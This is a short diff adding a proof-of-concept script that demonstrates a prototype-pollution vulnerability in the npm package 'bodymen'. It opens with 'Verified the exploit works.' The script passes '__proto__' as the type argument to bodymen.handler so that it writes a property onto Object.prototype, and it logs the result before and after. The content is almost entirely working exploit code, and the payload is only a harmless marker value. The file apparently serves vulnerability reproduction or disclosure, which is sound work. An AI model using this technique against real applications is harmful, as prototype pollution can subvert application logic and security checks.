@@ -1,0 +1,16 @@
+Verified the exploit works.
+
+```javascript
+const bodymen = require("bodymen");
+
+// Before: plain objects have no `polluted` property.
+console.log("before exploit:", ({}).polluted);
+
+// bodymen's `handler(type, name, fn)` does `handlers[type][name] = fn`
+// with no sanitization of `type`, so passing "__proto__" lets an
+// attacker-controlled key/value pair pollute Object.prototype.
+bodymen.handler("__proto__", "polluted", "yes");
+
+// After: every object in the process now inherits `polluted`.
+console.log("after exploit:", ({}).polluted);
+```
